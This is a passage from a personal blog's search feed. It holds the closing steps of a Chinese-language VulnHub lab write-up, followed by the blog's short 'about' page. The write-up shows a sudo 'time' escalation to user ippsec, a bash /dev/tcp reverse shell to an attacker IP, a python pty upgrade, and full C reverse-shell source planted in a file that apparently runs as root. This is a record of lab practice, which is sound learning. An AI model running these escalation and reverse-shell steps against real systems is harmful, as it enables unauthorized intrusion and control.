src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png" alt="image-20231019163337680"></p></li><li><p>利用其他用户命令执行和<code>time</code> 指令提权，可以跳转到 <code>ippsec</code> 用户</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u ippsec <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/time /</span>bin/sh<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png" alt="image-20231019164601120"></p><ol start="5"><li>这里发现切换用户后仍然会断开连接，于是返回上一步，直接反弹shell</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> -u ippsec /bin/time /bin/sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.48.129</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>同时kali监听8888端口，成功拿到 <code>ippsec</code> 用户的shell且不会断开，利用python拿到交互式命令行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><ol start="6"><li><p>到这一步没什么思路了，尝试上传提权脚本也提示无权限，经过搜索发现 <code>ippsec</code> 用户在 <code>/var/www/wordpress/.git</code> 目录下具有可写权限，于是我们在该目录尝试上传脏牛内核提权脚本，失败了，但是在该目录下发现了另一个c语言文件<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png" alt="image-20231020131018436"></p></li><li><p>似乎是用来踢下线前警告的程序，猜测是root身份运行的，修改内容为反弹shell的c代码</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> tcp_port = <span class="hljs-number">7777</span>;<br><span class="hljs-type">char</span> *ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rev_shell</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-keyword">if</span> ( fork() &lt;= <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> addr;<br>addr.sin_family = AF_INET;<br>addr.sin_port = <span class="hljs-built_in">htons</span>(tcp_port);<br>addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ip);<br><br>fd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">connect</span>(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-built_in">sizeof</span>(addr)) )&#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-built_in">dup2</span>(fd, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//dup2(fd, 1);</span><br><span class="hljs-comment">//dup2(fd, 2);</span><br><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">rev_shell</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="8"><li>可惜这个代码反弹的shell只能执行命令不能看到回显，只能重新弹一个<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png" alt="image-20231020133345647"></li></ol><p>拿下</p><p>​    </p>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>vulnhub</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>Hello everyone, here’s <strong>greed</strong> 🤗.</p><p>welcome to my blog and thanks for your views 😀 .</p><p>My records include but are not limited to the following: </p><ul><li>CTF writeup(web)</li><li>Cyber Range(like Vulnhub)</li><li>Study notes</li><li>small knowledge points encountered</li><li>…</li></ul><p>Thanks to the technical support provided by the following websites:</p><ul><li><a href="https://hexo.io/zh-cn/">Hexo</a></li><li><a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid-dev&#x2F;hexo-theme-fluid: :ocean:</a></li><li><a href="https://waline.js.org/">Waline评论系统</a></li><li><a href="https://hitokoto.cn/">一言</a></li><li><a href="https://busuanzi.ibruce.info/">不蒜子 - 极简网页计数器</a></li></ul><!-- That's all, thanks again. -->]]></content>
    
  </entry>
  
  
  
</search>
